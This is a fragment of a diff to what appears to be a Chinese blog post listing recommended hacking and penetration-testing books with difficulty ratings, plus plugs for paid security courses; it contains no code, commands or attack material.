-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210509180409778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 《黑客大揭秘：近源渗透测试》
 
 《内网安全防范：渗透测试实战指南》
-整理整理了2019 年国外卖得火热的黑客书籍，下面列出了一个清单。（再也不愁不知道送什么礼物了~）
+整理整理了2019 年国外卖得火热的黑客书籍，下面列出了一个清单。
 
 排名不分先后。源自：Mejores libros de Hacking 2019-2020: Principiante a Avanzado
 01：Kali Linux Revealed: Mastering the Penetration Testing Distribution（难易度：★★☆☆☆）
@@ -5782,7 +6392,7 @@ SQL注入攻击与防御
 《新手入门|穿越赛博》：知识盒子 新手入门|穿越赛博：常见安全工具安装与使用，视频教学，截图验证，适合网络安全入门
 《主题进阶|前端黑客》：知识盒子 前端迷雾：常见web前端安全漏洞，简单易懂，在线靶场练习，视频演示，通过学习掌握基础前端安全思路
 《暗夜契约|Python黑客》：知识盒子 python黑客: 内容涵盖流量分析，Flask模板注入等常见python安全基础与工具开发，需要有一定python基础，内容具有一定学习深度。
-编辑于 2020-06-24
+
 难度系数：⭐⭐⭐ 牛逼指数：⭐⭐⭐⭐ 实用指数：⭐⭐⭐⭐⭐
 
 《白帽子讲Web安全》
@@ -5842,6 +6452,7 @@ Books are a great way of deep diving into the theory, “The Web Application Hac
 
 
 ## 如何修成
+
 理解这些东西将带你走出瓶颈，知道你应该为提升什么能力而努力，直到你对这些东西充分理解才不会花了好几年成为一个平淡无奇的黑客。具体你有时间可以多读我的这一小节推荐链接。
 
 
